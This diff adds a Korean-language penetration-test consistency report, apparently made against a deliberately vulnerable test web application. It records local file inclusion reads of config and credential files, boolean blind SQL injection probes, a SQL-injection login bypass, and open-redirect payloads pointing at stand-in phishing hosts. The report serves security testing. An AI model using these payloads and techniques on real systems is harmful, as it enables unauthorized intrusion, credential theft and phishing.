@@ -1,0 +1,38 @@
+### A. 보고서 헤드라인 PoC 재현성 (오늘 시점)
+  A1 LFI db.asp            200   2908B  creds=YES
+  A2 LFI win.ini           200   2739B
+  A3 LFI web.config        200   3138B
+  A4 LFI unattend          200   7052B
+  A5 search.asp (1=1)      200 posttext=114   ← TRUE 기준값
+  A6 search.asp (1=2)      200 posttext=0   ← FALSE 기준값
+  A7 SYSTEM_USER='acunetix' 200 posttext=114
+  A8 Default.asp 링크: forum ids=['0', '1', '2']  thread ids=[]
+  A9 showforum id=0: AND 1=1 → 200 / AND 1=2 → 500
+  A11 showthread id=0      200 posttext=1 (우리 페이로드 잔존=NO ← 리셋으로 소실)
+  A12 _vti_cnf/Default.asp 200   926B vti_extenderversion=4.0.2.8912
+
+### B. 오픈 리다이렉트 4곳 — 정확한 분류 (Location 실측)
+  [Logout.asp  GET · 무인증]
+    http://example.com/          302 → http://example.com/
+    //evil.example/p             302 → //evil.example/p
+    https://attacker.tld/phish   302 → https://attacker.tld/phish
+    /\evil.example (백슬래시)        302 → /%5Cevil.example
+    \/evil.example               302 → %5C/evil.example
+    https:example.com (스킴만)      302 → https:example.com
+    %09//evil.example (탭)        302 → %09//evil.example
+    (대조군 없음)                     302 → Default.asp
+  [Login.asp  GET (POST 성공 전)]
+    GET http://example.com/     200 → (리다이렉트 없음)  ⇒ POST 성공이 선행 조건
+  [Login.asp  POST + SQLi 우회]
+    POST 우회+RetURL            302 → http://example.com/
+  [Register.asp  GET (POST 성공 전)]
+    GET http://example.com/     200 → (리다이렉트 없음)  ⇒ 성공한 등록 POST 가 선행 조건
+  [Templatize.asp  RetURL 사용 방식]
+    GET +RetURL                 200 → (리다이렉트 없음) / 본문에 URL 반영=False → 링크 생성용(리다이렉트 아님)
+
+### C. admin 계정/자격증명 사실 재확인 (리셋 후에도 동일한가)
+  admin 행 존재?          posttext=114 (0 초과면 TRUE)
+  upass 길이 4?           posttext=114
+  Round13 주입 행 잔존?   posttext=114 (0 이면 리셋으로 소실)
+
+### 완료 — 총 요청 27건 (쓰기 0건) → out/consistency.json
